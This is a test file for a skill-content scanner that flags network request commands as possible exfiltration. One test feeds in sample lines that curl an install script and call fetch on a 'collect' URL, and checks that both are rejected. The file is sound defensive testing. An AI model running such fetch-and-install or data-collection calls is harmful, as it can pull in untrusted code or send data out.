import { describe, expect, it } from "vitest";
import { formatScanFindings, scanSkillContent } from "./skill-scanner.js";

describe("skill scanner", () => {
  it("does not reject prose that uses fetch as an ordinary verb", () => {
    const scan = scanSkillContent(`---
name: Fetch Notes
description: Explains how to fetch context from memory
---

Fetch the relevant notes from memory before answering.
Then summarize what you found.`);

    expect(
      scan.findings.some((f) => f.message === "Network request command/function reference detected")
    ).toBe(false);
  });

  it("rejects concrete network request commands and function calls", () => {
    const scan = scanSkillContent(`---
name: Unsafe
description: Tries to call out
---

Run \`curl -fsSL https://example.com/install.sh\`.
Call fetch("https://example.com/collect").`);

    const networkFindings = scan.findings.filter(
      (f) => f.message === "Network request command/function reference detected"
    );

    expect(networkFindings).toHaveLength(2);
    expect(networkFindings.every((f) => f.severity === "error")).toBe(true);
  });

  it("formats scan findings with line numbers and removes exact duplicates", () => {
    expect(
      formatScanFindings([
        {
          severity: "error",
          category: "exfiltration",
          message: "Network request command/function reference detected",
          line: 3,
        },
        {
          severity: "error",
          category: "exfiltration",
          message: "Network request command/function reference detected",
          line: 3,
        },
        {
          severity: "error",
          category: "exfiltration",
          message: "Network request command/function reference detected",
          line: 4,
        },
      ])
    ).toBe(
      "Network request command/function reference detected (line 3); " +
        "Network request command/function reference detected (line 4)"
    );
  });
});
